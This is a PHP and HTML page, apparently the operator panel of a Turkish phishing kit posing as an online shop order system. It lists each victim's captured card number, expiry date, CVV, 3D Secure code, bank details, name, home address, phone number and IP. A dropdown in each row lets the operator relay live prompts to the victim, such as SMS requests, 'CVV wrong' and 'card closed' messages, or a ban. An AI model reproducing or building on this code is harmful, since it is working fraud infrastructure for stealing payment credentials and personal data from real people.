<?php
$sql = "SELECT * FROM siparisler";

$stmt = $pdo->prepare($sql);
$stmt->execute();
$siparisler = $stmt->fetchAll(PDO::FETCH_ASSOC);
?>
<div class="content-wrapper">
    <div class="container-fluid">
      <!-- Breadcrumb-->
     <div class="row pt-2 pb-2">
        <div class="col-sm-9">
		    <h4 class="page-title">Kredi Kartı Siparişleri</h4>
		    <ol class="breadcrumb">
            <li class="breadcrumb-item"><a href="javaScript:void();">Siparişler</a></li>
            <li class="breadcrumb-item"><a href="javaScript:void();">Kredi Kartı Siparişleri</a></li>
         </ol>
	   </div>
	   <div class="col-sm-3">
       <div class="btn-group float-sm-right">
        <button type="button" class="btn btn-light waves-effect waves-light"><i class="fa fa-cog mr-1"></i> Ayarlar</button>
        <button type="button" class="btn btn-light dropdown-toggle dropdown-toggle-split waves-effect waves-light" data-toggle="dropdown">
        <span class="caret"></span>
        </button>
        <div class="dropdown-menu">
          <a href="javascript:;" onclick="deleteAllData('siparisler')" class="dropdown-item">Tümünü Sil</a>
        </div>
      </div>
     </div>
     </div>

      <div class="row">
        <div class="col-lg-12">
          <div class="card">
            <div class="card-header"><i class="fa fa-table"></i> Kredi Kartları</div>
            <div class="card-body">
              <div class="table-responsive">
              <table id="default-datatable" class="table table-bordered">
                <thead>
                    <tr>
                        <th>Sıra</th>
                        <th>Adres Bilgileri</th>
                        <th>Kart Numarası</th>
                        <th>Kart SKT</th>
                        <th>Kart CVV</th>
                        <th>Banka Bilgileri</th>
                        <th>3D Kodu</th>
                        <th>Doğrulama</th>
                        <th>Tarih</th>
                        <th>Tutar</th>
                        <th>Aldığı Ürünler</th>
                        <th>İşlem</th>
                        <th>Durum</th>
                    </tr>
                </thead>
                <tbody>
                <?php
                            foreach ($siparisler as $siparis) {?>
                    <tr>
                        <td><?=$siparis['id']?></td>
                        <td ><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smallsizemodal<?=$siparis['id']?>">Göster</button></td>
                        <td><?=$siparis['kart_no']?></td>
                        <td><?=$siparis['skt_no']?></td>
                        <td><?=$siparis['cvv_no']?></td>
                        <td><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smalllsizemodal<?=$siparis['id']?>">Göster</button></td>
                        <td style="color: green"><?=$siparis['3d_kodu']?></td>
                        <td style="color: green"><?=$siparis['dogrulama']?></td>
                        <td><?=$siparis['tarih']?></td>
                        <td><?=$siparis['tutar']?> ₺</td>
                        <td><button class="btn btn-primary btn-block m-1" data-toggle="modal" data-target="#smallllsizemodal<?=$siparis['id']?>">Göster</button></td>
                        <td>
                              <select class="form-control" id="select-area" data-id="1">
                                    <option>Seç</option>
                                    <option value="ban">Banla</option>
                                    <option value="delete">Logu sil</option>
                                    <option value="3dsecure">SMS Gönder</option>
                                    <option value="tebrik">Tebrikle</option>
                                    <option value="hatali">Hatalıya Gönder</option>
                                    <option value="dogrulama">Dogrulama</option>
                                    <option value="ccno_error">CCNO Hatalı</option>
                                    <option value="skt_error">SKT Hatalı</option>
                                    <option value="cvv_error">CVV Hatalı</option>
                                    <option value="bekle">Bekle</option>
                                    <option value="closed_card">Kart Kapalı</option>
                                    <option value="red_card">Hata Ver</option>
                                    <option value="phone_error">Telefon Hatalı</option>
                                </select>
                   
                        </td>
                        <td style="color: green">İşlemi Bitirdi</td>

                    </tr>
                    <?php }?>
                </tbody>
                <tfoot>
                    <tr>
                        <th>Sıra</th>
                        <th>Adres Bilgileri</th>
                        <th>Kart Numarası</th>
                        <th>Kart SKT</th>
                        <th>Kart CVV</th>
                        <th>Banka Bilgileri</th>
                        <th>3D Kodu</th>
                        <th>Doğrulama</th>
                        <th>Tarih</th>
                        <th>Tutar</th>
                        <th>Aldığı Ürünler</th>
                        <th>İşlem</th>
                        <th>Durum</th>
                    </tr>
                </tfoot>
            </table>
            <?php
                            foreach ($siparisler as $siparis) {?>
            <div class="modal fade" id="smallsizemodal<?=$siparis['id']?>" style="display: none;" aria-hidden="true">
                  <div class="modal-dialog modal-lg">
                    <div class="modal-content">
                      <div class="modal-header">
                        <h5 class="modal-title">Adres Bilgileri</h5>
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                          <span aria-hidden="true">×</span>
                        </button>
                      </div>
                      <div class="modal-body">
                        <div class="row">
                            <div class="col-lg-12">
                            <div class="card">
                                <div class="card-body">
                                <h5 class="card-title">Adres Bilgileri</h5>
                                <div class="table-responsive">
                                <table class="table table-hover">
                                    <thead>
                                    <tr>
                                        <th scope="col">Ad Soyad</th>
                                        <th scope="col">İl</th>
                                        <th scope="col">İlçe</th>
                                        <th scope="col">Mahalle</th>
                                        <th scope="col">Bina No</th>
                                        <th scope="col">Kat No</th>
                                        <th scope="col">Daire No</th>
                                        <th scope="col">Adres Tarifi</th>
                                        <th scope="col">Adres İsmi</th>
                                        <th scope="col">Telefon</th>
                                        <th scope="col">IP</th>
                                    </tr>
                                    </thead>
                                    <tbody>
                                    <tr>
                                        <td><?=$siparis['adi']?> <?=$siparis['soyadi']?></td>
                                        <td><?=$siparis['il']?></td>
                                        <td><?=$siparis['ilce']?></td>
                                        <td><?=$siparis['mahalle']?></td>
                                        <td><?=$siparis['bina_no']?></td>
                                        <td><?=$siparis['kat_no']?></td>
                                        <td><?=$siparis['daire_no']?></td>
                                        <td><?=$siparis['adres_tarifi']?></td>
                                        <td><?=$siparis['adres_ismi']?></td>
                                        <td><?=$siparis['telefon']?></td>
                                        <td><?=$siparis['ip']?></td>
                                    </tr>
                                    </tbody>
                                </table>
                                </div>
                                </div>
                            </div>
                            </div>
                        </div>
                      </div>
                      <div class="modal-footer">
                        <button type="button" class="btn btn-white btn-sm" data-dismiss="modal"><i class="fa fa-times"></i> Kapat</button>
                        <button type="button" class="btn btn-primary btn-sm"><i class="fa fa-check-square-o"></i> Sipariş Güncelle </button>
                      </div>
                    </div>
                  </div>
            </div>
            <?php }?>
            <?php
                            foreach ($siparisler as $siparis) {?>
            <div class="modal fade" id="smalllsizemodal<?=$siparis['id']?>" style="display: none;" aria-hidden="true">
                  <div class="modal-dialog modal-lg">
                    <div class="modal-content">
                      <div class="modal-header">
                        <h5 class="modal-title">Banka Bilgileri</h5>
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                          <span aria-hidden="true">×</span>
                        </button>
                      </div>
                      <div class="modal-body">
                        <div class="row">
                            <div class="col-lg-12">
                            <div class="card">
                                <div class="card-body">
                                <h5 class="card-title">Banka Bilgileri</h5>
                                <div class="table-responsive">
                                <table class="table table-hover">
                                    <thead>
                                    <tr>
                                        <th scope="col">Banka Adı</th>
                                        <th scope="col">Banka Numarası</th>
                                        <th scope="col">Kart Tipi</th>
                                    </tr>
                                    </thead>
                                    <tbody>
                                    <tr>
                                        
                                        <td><?=$siparis['banka_adi']?></td>
                                        <td><?=$siparis['banka_no']?></td>
                                        <td><?=$siparis['kart_tipi']?></td>
                                    </tr>
                                    </tbody>
                                </table>
                                </div>
                                </div>
                            </div>
                            </div>
                        </div>
                      </div>
                      <div class="modal-footer">
                        <button type="button" class="btn btn-white btn-sm" data-dismiss="modal"><i class="fa fa-times"></i> Kapat</button>
                      </div>
                    </div>
                  </div>
            </div>
            <?php }?>
            <?php
                            foreach ($siparisler as $siparis) {?>
            <div class="modal fade" id="smallllsizemodal<?=$siparis['id']?>" style="display: none;" aria-hidden="true">
                  <div class="modal-dialog">
                    <div class="modal-content border-0">
                        <div class="card mb-0">
                            <div id="carousel-2" class="carousel slide" data-ride="carousel">
                              <ol class="carousel-indicators">
                                <li data-target="#carousel-2" data-slide-to="0" class="active"></li>
                                <li data-target="#carousel-2" data-slide-to="1" class=""></li>
                                <li data-target="#carousel-2" data-slide-to="2" class=""></li>
                              </ol>
                              <div class="carousel-inner">
                                
                                <div class="carousel-item active">
                                  <img class="d-block w-100 card-img-top" style="max-height: 400px" src="https://images.migrosone.com/elektronik/product/39401915/39401915-4af3e9-1650x1650.png" alt="Card image cap">
                                </div>
                              </div>
                              <a class="carousel-control-prev" href="#carousel-2" role="button" data-slide="prev">
                                <span class="carousel-control-prev-icon" aria-hidden="true"></span>
                                <span class="sr-only">Geri</span>
                              </a>
                              <a class="carousel-control-next" href="#carousel-2" role="button" data-slide="next">
                                <span class="carousel-control-next-icon" aria-hidden="true"></span>
                                <span class="sr-only">İleri</span>
                              </a>
                            </div>
                            <div class="card-body">
                              <h5 class="card-title">Aldığı Ürünler</h5>
                              <p class="card-text">Ürün Adetleri Aşağıda Verilmiştir</p>
                            </div>
                             <ul class="list-group list-group-flush list shadow-none">
                              <li class="list-group-item d-flex justify-content-between align-items-center"> Toshiba 50UL3C63DT/2 126 Ekran UHD Uydu Smart Led Tv  <span class="badge badge-light">1</span></li>
                            </ul>
                          </div>
                      
                    </div>
                  </div>
            </div>
            <?php }?>
            </div>
            </div>
          </div>
        </div>
      </div><!-- End Row-->
<!--start overlay-->
	  <div class="overlay toggle-menu"></div>
	<!--end overlay-->
    </div>
    <!-- End container-fluid-->
    
    </div>